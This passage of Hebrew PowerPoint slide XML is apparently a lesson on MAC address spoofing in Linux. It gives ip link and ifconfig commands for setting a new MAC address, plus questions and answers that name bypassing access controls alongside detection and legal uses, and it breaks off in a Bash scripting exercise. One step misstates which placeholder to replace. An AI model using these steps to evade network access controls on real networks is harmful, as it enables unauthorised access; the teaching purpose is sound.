              <a:t>שלב 1: הכנה</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>לפני שמבצעים שינוי בכתובת ה-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>MAC </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> יש צורך להוריד את הממשק מהרשת.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>במערכת הפעלה </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Linux</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>פתיחת טרמינל: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>פתח את הטרמינל במערכת שלך.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>כיבוי הכרטיס: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>הקלד את הפקודה</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1" algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>sudo</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>ip</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> link set dev &lt;interface&gt; down</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>החלף את </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>&lt;interface&gt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> שם של כרטיס הרשת שלך, לדוגמא: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>eth1</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> או </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>wlan1</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> (במקום 1 יכול להיות גם 0)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>שינוי כתובת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>:MAC</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>הקלד את הפקודה</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>sudo</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>ip</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> link set dev &lt;interface&gt; address &lt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>new_mac_address</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>עכשיו החלף את </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>&lt;interface&gt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> לכתובת החדשה שאתה רוצה </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>ליתן</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> שהיא </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>&lt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>new_mac_address</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>&gt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>הפעלת הכרטיס מחדש: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>הקלד את הפקודה </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>sudo</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>ip</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> link set dev &lt;interface&gt; up</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>אימות השינוי: </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>הקלד את הפקודה </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>ip</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>addr</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> show &lt;interface&gt;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3181594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103A818-EFAC-416A-B261-09A3A81AC7EC}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2037522" y="642594"/>
            <a:ext cx="9087678" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="90000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>המשך - זיוף כתובת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>MAC</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> הלכה למעשה</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B8C62FDB-3D81-48EF-9FBD-55F3B39609FA}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>דוגמא:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>נניח שהממשק שלנו הוא </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>eth0</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> וכתובת ה-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>MAC </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> החדשה שאנחנו רוצים להגדיר היא 00:11:22:33:44:55</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>נשתמש ב- </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>ifconfig</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>דבר ראשון אנו נכבה את הפורט</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>sudo</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
              </a:rPr>
              <a:t>ifconfig</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> eth0 down</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>דבר שני אנו נשנה את כתובת ה- </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>MAC</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>sudo</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
              </a:rPr>
              <a:t>ifconfig</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> eth0 </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>hw</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> ether 00:11:22:33:44:55</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>דבר שלישי אנו נפעיל את הפורט מחדש</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>sudo</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
              </a:rPr>
              <a:t>ifconfig</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> eth0 up</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="180319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BD0E575-BE6B-46B7-9B7A-22C8141BFF31}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2057400" y="642594"/>
            <a:ext cx="9067800" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="90000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>המשך - זיוף כתובת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>MAC</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> הלכה למעשה</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{FE2E8CE3-FFB7-4E25-BD9B-2949A643BCF8}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>דוגמא:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>נניח שהממשק שלנו הוא </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>eth0</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> וכתובת ה-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>MAC </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> החדשה שאנחנו רוצים להגדיר היא 00:11:22:33:44:55</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>נשתמש ב- </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>ip</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>דבר ראשון אנו נכבה את הפורט</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>sudo</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
              </a:rPr>
              <a:t>ip</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
              </a:rPr>
              <a:t> link set </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>dev eth0 down</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>דבר שני אנו נשנה את כתובת ה- </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>MAC</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>sudo</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
              </a:rPr>
              <a:t>ip</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
              </a:rPr>
              <a:t> link set </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>dev eth0 address 00:11:22:33:44:55</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>דבר שלישי אנו נפעיל את הפורט מחדש</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>sudo</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1">
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
              </a:rPr>
              <a:t>ip</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0">
                <a:highlight>
                  <a:srgbClr val="FFFF00"/>
                </a:highlight>
              </a:rPr>
              <a:t> link set </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>dev eth0 up</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="26642325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955332-325C-475F-9FB4-B1410614B9CF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2355574" y="642594"/>
            <a:ext cx="8769626" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>המשך - זיוף כתובת</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> - MAC </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>שאלות</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{AAEFA7C2-2A5F-4A2B-AEF6-0E7A4F27F98E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>1. מה היתרונות והסכנות של זיוף כתובת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>MAC</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> ?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>2. כיצד ניתן לזהות זיוף כתובת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> MAC</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>ברשת?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>3. איזה מידע צריך לדעת לפני שמבצעים שינוי בכתובת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>MAC</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> ?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>4. מהם השימושים החוקיים של שינוי כתובת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> MAC</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>?</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="398755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C8FAD96-1D0D-41DA-AB29-97004AD8D3A3}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2107096" y="642594"/>
            <a:ext cx="9018104" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>המשך - זיוף כתובת</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> - MAC </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>תשובות</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F30AB4A2-D95F-4912-AED1-9CF3E8ECA3E8}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>1. יתרונות כוללים עקיפת בקרות גישה והתמקמות מחדש במערכות רשת. סכנות כוללות פגיעות לביצוע התקפות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>MITM </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> ויכולת לחבלה ברשתות.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>2. ניתן לזהות זיוף באמצעות ניתוח תעבורה ברשת, שימוש בכלים לניהול רשת, או באמצעות מדיניות אבטחה </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>המנטרת</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> שינויים בכתובת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>MAC</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>3. חשוב לדעת את שם כרטיס הרשת, את הכתובת</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>MAC </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> החדשה שברצונך להגדיר, ולוודא שהשינוי לא יפגע בתפקוד הרשת או בהגדרות אחרות.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>4. שינויים חוקיים כוללים פתרון בעיות רשת, שיפור פרטיות, והגנה על גישות לרשתות ציבוריות.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3077378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A024A5-4535-420F-9EC4-56A4AF2CB308}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2484782" y="642594"/>
            <a:ext cx="8640417" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>המשך - זיוף כתובת</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> - MAC </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>שאלה</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{66AE6042-2633-4C1D-8926-FB21148BEB53}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t>שאלה: כתיבת סקריפט</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Bash </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" b="1" dirty="0"/>
              <a:t> לזיוף כתובת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>MAC</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>כתבו סקריפט ב-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Bash </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>שמשנה את כתובת ה-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> MAC </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>של כרטיס רשת מסוים. הסקריפט צריך לקבל כקלט את שם כרטיס הרשת ואת כתובת ה-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> MAC </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
